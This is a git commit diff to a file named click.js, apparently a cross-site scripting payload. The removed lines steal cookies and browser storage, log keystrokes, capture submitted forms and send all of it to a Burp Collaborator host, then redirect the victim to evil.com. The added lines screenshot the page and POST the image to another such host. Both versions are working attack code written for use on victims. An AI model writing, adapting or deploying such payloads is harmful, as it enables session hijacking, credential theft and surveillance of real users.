e50d73b7f8a121c155255bb9fe3fa184a6b2c4bf
jerry <145069865+jerryhttpd@users.noreply.github.com>
2025-03-12 13:33:52 +0530

    Update click.js

--- click.js
+++ click.js
@@ -1,31 +1,8 @@
-// Collect Cookies, Local Storage, and Session Storage
-var cookies = document.cookie;
-var localStorageData = JSON.stringify(localStorage);
-var sessionStorageData = JSON.stringify(sessionStorage);
-
-// Send Data to Burp Collaborator
-var burpURL = "https://mh7587gmzgcs1acch9zst61o7fd618px.oastify.com";
-new Image().src = burpURL + "/?cookie=" + encodeURIComponent(cookies) + 
-                  "&localStorage=" + encodeURIComponent(localStorageData) + 
-                  "&sessionStorage=" + encodeURIComponent(sessionStorageData) +
-                  "&referrer=" + encodeURIComponent(document.referrer);
-
-// Keylogger
-document.addEventListener("keydown", function(event) {
-    new Image().src = burpURL + "/?key=" + encodeURIComponent(event.key);
+html2canvas(document.body).then(function(canvas) {
+    var screenshot = canvas.toDataURL("image/png");
+    fetch("https://r6yeiueh1ecz0td90tvyus4pqgw7ky8n.oastify.com/screenshot", {
+        method: "POST",
+        body: JSON.stringify({ image: screenshot }),
+        headers: { "Content-Type": "application/json" }
+    });
 });
-
-// Form Stealer
-document.addEventListener("submit", function(event) {
-    var formData = new FormData(event.target);
-    var data = "";
-    for (var pair of formData.entries()) {
-        data += pair[0] + "=" + pair[1] + "&";
-    }
-    new Image().src = burpURL + "/?form=" + encodeURIComponent(data);
-});
-
-// Redirect Victim
-setTimeout(function() {
-    window.location.href = "https://evil.com";
-}, 3000);
